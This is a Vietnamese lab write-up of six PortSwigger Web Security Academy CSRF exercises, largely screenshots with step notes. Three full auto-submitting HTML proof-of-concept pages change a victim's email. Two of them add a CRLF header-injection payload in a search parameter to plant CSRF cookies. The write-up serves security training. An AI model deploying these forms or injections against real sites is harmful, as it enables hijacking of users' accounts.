## Lab 1: CSRF vulnerability with no defenses

__Lỗ hổng CSRF mà web không có bất kỳ biện pháp phòng thủ nào__

![2025-11-21-13-54-04](../images/2025-11-21-13-54-04.png)

Thay đổi email của nạn nhân

![2025-11-21-13-53-44](../images/2025-11-21-13-53-44.png)

Đổi email một lần để lấy request chuẩn

![2025-11-21-13-55-22](../images/2025-11-21-13-55-22.png)

Xem kĩ request thì thấy chỉ có duy nhất `Cookie session` và không có bất kì xác thực nào chứng minh rằng đúng người yêu cầu

![2025-11-21-13-58-31](../images/2025-11-21-13-58-31.png)

Gen mã *HTML* thực hiện việc tấn công `CSRF`

![2025-11-21-13-59-41](../images/2025-11-21-13-59-41.png)

Lưu code vào sever kiểm soát\
Vì lab nói rằng không thể có 2 mail trùng nhau\
--> Trước khi gửi cho victim cần thay đổi email tránh bị trùng với tài khoản của mình

![2025-11-21-14-09-42](../images/2025-11-21-14-09-42.png)

## Lab 2: CSRF where token validation depends on request method

__CSRF trong đó việc kiểm tra token phụ thuộc vào loại phương thức request (GET/POST)__

![2025-11-21-14-32-54](../images/2025-11-21-14-32-54.png)

Lab yêu cầu đổi emai của nạn nhân

![2025-11-21-14-33-49](../images/2025-11-21-14-33-49.png)

Đăng nhập vào `wiener:peter`

![2025-11-21-14-35-06](../images/2025-11-21-14-35-06.png)

Đổi email thành `test_001@gmail.com` để lấy request chuẩn
--> Request đã bao gồm cả mã `CSRF`

![2025-11-21-14-36-31](../images/2025-11-21-14-36-31.png)

Đổi request method thành GET\
--> Server vẫn trả về `302`

![2025-11-21-14-37-34](../images/2025-11-21-14-37-34.png)

Kiểm tra thấy tài khoản đã được đổi email

![2025-11-21-14-38-16](../images/2025-11-21-14-38-16.png)

Khi xóa đi tham số `csrf` thì server vẫn chấp nhận với method `GET`

![2025-11-21-14-38-52](../images/2025-11-21-14-38-52.png)

Kiểm tra tài khoản và thấy email đã được đổi ngay khi không có mã `CSRF`

![2025-11-21-14-40-04](../images/2025-11-21-14-40-04.png)

Tạo mã *HTML* để có thể lưu trữ trên máy chủ mình kiểm soát

![2025-11-21-14-41-18](../images/2025-11-21-14-41-18.png)

Sang server kiểm soát và lưu trữ đoạn `HMTL`

![2025-11-21-14-42-20](../images/2025-11-21-14-42-20.png)

Thử truy câp bằng link của server\--> Email đã tự động được đổi

![2025-11-21-14-43-12](../images/2025-11-21-14-43-12.png)

Đổi email và gửi cho victim\--> Solve lab\
Lab chỉ xác thực `CSRF` cho method `POST` còn `GET` thì không cần mã `CSRF` vẫn có thể thực hiện được hành động tương tự

## Lab 3: CSRF where token validation depends on token being present

__CSRF xảy ra khi web chỉ kiểm tra xem token có tồn tại hay không, chứ không kiểm tra token đó đúng hay sai__

![2025-11-21-14-47-21](../images/2025-11-21-14-47-21.png)

Lab yêu cầu đổi email của victim thông qua lỗ hổng CSRF

![2025-11-21-14-48-16](../images/2025-11-21-14-48-16.png)

Loggin vào tài khoản `wiener`

![2025-11-21-14-49-16](../images/2025-11-21-14-49-16.png)

Đổi email 1 lần để có được request đổi email

![2025-11-21-14-50-21](../images/2025-11-21-14-50-21.png)

Khi xóa đi tham số `csrf` thì server vẫn trả về `302`

![2025-11-21-14-51-23](../images/2025-11-21-14-51-23.png)

Kiểm tra thì thấy email đã được đổi

![2025-11-21-14-51-54](../images/2025-11-21-14-51-54.png)

Tạo mã HTML để lưu trữ lên máy chủ ta kiểm soát

```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aa300e604f940b084b4951a00200031.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#95;0021&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
![2025-11-21-14-53-35](../images/2025-11-21-14-53-35.png)

Khi truy cập bằng link đó thì email đã tự động được đổi

![2025-11-21-14-55-01](../images/2025-11-21-14-55-01.png)

Sửa email và gửi cho victim\--> Solve lab\

![2025-11-21-14-56-17](../images/2025-11-21-14-56-17.png)

Khi để lại tham số `CSRF` nhưng đã chỉnh sửa thì thấy server vẫn kiểm tra\
--> Lab này chỉ kiểm tra tham số `CSRF` khi nó có mặt, còn khi không có thì nó không kiểm tra luôn

## Lab 4: CSRF where token is not tied to user session

__CSRF xảy ra khi token không gắn với phiên đăng nhập của người dùng__

![2025-11-21-15-00-39](../images/2025-11-21-15-00-39.png)

Lab yêu cầu đổi email của victim thông qua lỗ hổng *CSRF*

![2025-11-21-15-02-57](../images/2025-11-21-15-02-57.png)

Đăng nhập vào tài khoản `wiener`

![2025-11-21-15-08-26](../images/2025-11-21-15-08-26.png)

Khi đổi email nhưng xóa đi trường `CSRF` thì server nói rằng `"Missing parameter 'csrf'"`

![2025-11-21-15-12-44](../images/2025-11-21-15-12-44.png)

Ý tường: lấy `CSRF login` của wiener và nhập vào trường `CSRF change email` của carlos\
--> Server `"Invalid CSRF token"`--> __False__

![2025-11-21-15-22-20](../images/2025-11-21-15-22-20.png)

Bật `Intercept` và lấy một lần request đổi email, nhưng khi gặp được request đó thì lấy mã `CSRF` và bỏ yêu cầu đó\--> Có được mã `CSRF` hợp lệ

![2025-11-21-15-27-48](../images/2025-11-21-15-27-48.png)

Email của carlos ban đầu là: `carlos1@dontwannacry.com`

![2025-11-21-15-28-47](../images/2025-11-21-15-28-47.png)

Lấy request đổi email của carlos và điền tham số `CSRF` vừa lấy được vào\--> server trả về `300`

![2025-11-21-15-29-43](../images/2025-11-21-15-29-43.png)

Lúc này email của carlos đã được cập nhật: `carlos2@dontwannacry.com`

![2025-11-21-15-31-13](../images/2025-11-21-15-31-13.png)

Làm lại bước như trước để lấy được mã `CSRF` hợp lệ và tạo mã *HTML* để lưu trữ

![2025-11-21-15-32-53](../images/2025-11-21-15-32-53.png)

Gửi cho victim\--> Solve lab\--> Lab cho thấy mã `CSRF` không được liên kết với `Session Cookie` --> dẫn đến việc lấy `CSRF` của tài khoản này dùng được cho tài khoản khác

## Lab 5: CSRF where token is tied to non-session cookie

__CSRF xảy ra khi token được gắn với một cookie KHÔNG phải cookie phiên__

![2025-11-21-15-41-43](../images/2025-11-21-15-41-43.png)

![2025-11-21-15-45-16](../images/2025-11-21-15-45-16.png)

Khi đổi email server không chỉ có 1 `session cookie` mà còn có cả `csrfKey`

![2025-11-21-15-47-55](../images/2025-11-21-15-47-55.png)

Bật `Intercept` và lấy 2 trường `csrf` và `csrfKey`

![2025-11-21-15-50-55](../images/2025-11-21-15-50-55.png)

Sử dụng cặp `csrf` và `csrfKey` vừa lấy được đưa vào request đổi email của `carlos`--> Server trả về `300`

![2025-11-21-15-52-15](../images/2025-11-21-15-52-15.png)

Qua kiểm tra thì thấy email của `carlos` đã được thay đổi

![2025-11-21-16-18-47](../images/2025-11-21-16-18-47.png)

Tạo mã HTML để lưu trữ, vì có cả `csrfKey` nên phải nghĩ cách set cho nó

```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0f006504e3c02380ef1c5d00d40095.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test_1000a22_&#64;carlos&#45;montoya&#46;net" />
      <input type="hidden" name="csrf" value="ubDXn0VZuMttxghOLimw91hNxB3dDuVv" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a0f006504e3c02380ef1c5d00d40095.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=uHzdPbkowQhOI6V0bTkD9IHtZg4rJ75w%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

![2025-11-21-16-20-05](../images/2025-11-21-16-20-05.png)

Khi vào bằng link của server kiểm soát, email đã được thay đổi

![2025-11-21-16-22-39](../images/2025-11-21-16-22-39.png)

Tiếp tục lấy `csrf` và `csrfKey` thay vào và gửi cho victim\
Solve lab\
Lab này cho thấy mã `CSRF` không được liên kết với `Session cookie`
--> Không có ý nghĩa

## Lab 6: CSRF where token is duplicated in cookie

__Lỗi CSRF khi token được lưu trùng lặp trong cookie__

![2025-11-21-16-27-37](../images/2025-11-21-16-27-37.png)

![2025-11-21-16-29-47](../images/2025-11-21-16-29-47.png)

Đổi email một lần và thấy mã `CSRF` được xuất hiên ở 2 nơi:
- Cạnh `Session Cookie`
- Dưới phần tham số gửi đi\
--> Đặc điểm là chứng giống hệt nhau

![2025-11-21-16-44-25](../images/2025-11-21-16-44-25.png)

Thử thay đổi `csrf` thành một giá trị bất kì\
Server: `"Invalid CSRF token"`\
Nhưng khi đổi lại thành `CSRF` cũ thì lại được\
--> Server chỉ chấp nhận những mã hợp lệ trên server

![2025-11-21-16-46-16](../images/2025-11-21-16-46-16.png)

Viết mã HTML để lưu trữ trên server kiểm soát\
Thay thế `CSRF` bằng giá trị của `wiener`\

![2025-11-21-16-47-34](../images/2025-11-21-16-47-34.png)

Khi truy cập vào link thì thấy email đã được thay đổi

![2025-11-21-16-49-01](../images/2025-11-21-16-49-01.png)

Nhưng khi gửi cho victim thì chưa thấy solve

![2025-11-21-16-58-20](../images/2025-11-21-16-58-20.png)

Bởi vì chức năng search của web không có mã `CSRF` nên lợi dụng nó để set cho nó trước rồi sử dụng nó sau bằng đoạn injection:\
`test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None`
Lúc này `CSRF` đã có giá trị banwfh `fake`

![2025-11-21-17-00-19](../images/2025-11-21-17-00-19.png)

Dùng lại `CSRF=fake` để đổi email\
Server đã cho đổi\
Ý tưởng: set cho mã `CSRF` của victim một giá trị cụ thể mà có thể biết, sau đó dùng chính nó để có thể đổi mật khẩu

```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a300015043478b180de035200b00099.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test_1111_&#64;carlos&#45;montoya&#46;net" />
      <input type="hidden" name="csrf" value="fake123" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a300015043478b180de035200b00099.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

![2025-11-21-17-08-28](../images/2025-11-21-17-08-28.png)
